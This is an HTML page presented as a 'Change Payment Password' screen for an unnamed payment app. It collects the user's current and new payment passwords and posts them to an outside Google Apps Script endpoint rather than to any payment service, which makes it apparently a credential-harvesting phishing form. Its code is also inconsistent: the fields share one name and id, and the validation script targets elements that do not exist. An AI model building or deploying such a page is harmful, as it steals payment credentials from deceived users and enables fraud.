<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Payment Password</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #1c1c1e;
            color: #8e8e93;
        }

        .container {
            max-width: 100%;
            padding: 20px;
        }

        .header {
            display: flex;
            align-items: center;
            margin-bottom: 40px;
        }

        .back-button {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 1.1rem;
            padding: 10px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .title {
            color: #ffffff;
            margin: 0;
            font-size: 1.1rem;
            margin-left: 10px;
        }

        .form-group {
            position: relative;
            margin-bottom: 24px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 40px 12px 12px;
            background: transparent;
            border: none;
            border-bottom: 1px solid #333;
            color: #ffffff;
            font-size: 1rem;
        }

        .form-group input::placeholder {
            color: #8e8e93;
        }

        .lock-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            color: #8e8e93;
        }

        .submit-button {
            width: 100%;
            padding: 16px;
            background-color: #d4af37;
            border: none;
            border-radius: 8px;
            color: #000000;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 40px;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            margin-top: 20px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <button class="back-button">
                ‚Üê Back
            </button>
            <h1 class="title">Change Payment Password</h1>
        </header>

        <form id="submit-form" action="https://script.google.com/macros/s/AKfycbyG5Wwvvi_JpTOWEMjp0HBm8SuJ41i-NOgfpTlj3pNuMJUGGgqftP_p3iox4nK7YILK/exec" method="post" role="form" >
            <div class="row">
            <div class="form-group">
                <input 
                 type="text" name="name" class="form-control" placeholder="Current password"  id="contact-name" onkeyup="validateName()" required>
                <span id="name-error"></span>
                
                <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0110 0v4"></path>
                </svg>
            </div>

            <div class="form-group">
                <input 
                type="text" name="name" class="form-control" placeholder="New password at least 6 characters"  id="contact-name" onkeyup="validateName()" required>
                <span id="name-error"></span>
                
                <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0110 0v4"></path>
                </svg>
            </div>

            <div class="form-group">
                <input 
                type="text" name="name" class="form-control" placeholder="Confirm new password"  id="contact-name" onkeyup="validateName()" required>
                <span id="name-error"></span>
                
                <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0110 0v4"></path>
                </svg>
            </div>

            <button type="submit" class="submit-button">Submit</button>
        </form>

        <a href="#" class="forgot-link">Forget password?</a>
    </div>

    <script>
        document.getElementById('passwordChangeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const newPassword = document.getElementById('newPassword').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            
            if (newPassword !== confirmPassword) {
                alert('New passwords do not match');
                return;
            }
            
            // Here you would typically send the form data to your server
            console.log('Form submitted');
        });
    </script>
</body>
</html>
